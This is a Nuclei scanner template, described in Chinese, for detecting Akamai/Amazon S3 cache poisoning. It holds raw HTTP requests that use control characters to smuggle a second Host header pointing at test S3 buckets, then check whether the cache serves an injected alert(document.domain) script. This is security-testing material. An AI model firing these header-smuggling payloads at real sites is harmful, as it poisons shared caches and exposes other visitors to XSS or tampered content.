id: akamai-s3-cache-poisoning

info:
  name: Akamai Amazon S3 缓存投毒
  author: DhiyaneshDk
  severity: high
  description: |
    该模板用于核查 Akamai Amazon S3 缓存投毒相关配置。该类问题通常源于 CDN、反向代理或缓存层对 Host、路径、查询参数或异常请求头处理不一致，导致攻击者可污染缓存内容。模板会向目标发送探测请求，并依据请求 `/nuclei.svg?{{rand}}=x`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能让缓存层保存恶意响应，使后续用户访问到被篡改的页面、脚本或重定向结果。
    - 在共享缓存命中的场景下，可能导致跨用户内容投毒、XSS、钓鱼或业务内容被替换。
  remediation: |
    - 统一源站与缓存层的 Host、路径、查询参数和异常请求头处理策略。
    - 仅缓存可信、可预期且不依赖用户输入的响应，并为动态页面设置合适的 Cache-Control。
    - 清理已污染缓存，审计 CDN/代理规则和异常缓存命中记录。
  reference:
    - https://web.archive.org/web/20230101082612/https://spyclub.tech/2022/12/14/unusual-cache-poisoning-akamai-s3/
    - https://owasp.org/www-community/attacks/Cache_Poisoning
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
    cvss-score: 7.1
    cwe-id: CWE-44
  metadata:
    verified: true
    max-request: 204
  tags: cache,poisoning,xss,akamai,s3,misconfig,vuln
variables:
  rand: "{{rand_base(5)}}"

http:
  - raw:
      - |+
        GET /nuclei.svg?{{rand}}=x HTTP/1.1
        Host: {{Hostname}}
        {{escape}}Host: {{bucket}}

      - |+
        GET /nuclei.svg?{{rand}}=x HTTP/1.1
        Host: {{Hostname}}

    attack: clusterbomb
    payloads:
      escape:
        - "\v"
        - "\f"
        - "\x1c"
        - "\x1d"
        - "\x1e"
        - "\x1f"
      bucket:
        - "nuclei-ap-northeast-1"
        - "nuclei-ap-northeast-2"
        - "nuclei-ap-northeast-3"
        - "nuclei-ap-south-1"
        - "nuclei-ap-southeast-1"
        - "nuclei-ap-southeast-2"
        - "nuclei-ca-central-1"
        - "nuclei-eu-central-1"
        - "nuclei-eu-north-1"
        - "nuclei-eu-west-1"
        - "nuclei-eu-west-2"
        - "nuclei-eu-west-3"
        - "nuclei-sa-east-1"
        - "nuclei-us-east-1"
        - "nuclei-us-east-2"
        - "nuclei-us-west-1"
        - "nuclei-us-west-2"
    stop-at-first-match: true
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "alert(document.domain)")'
          - 'status_code_2 == 200'
        condition: and
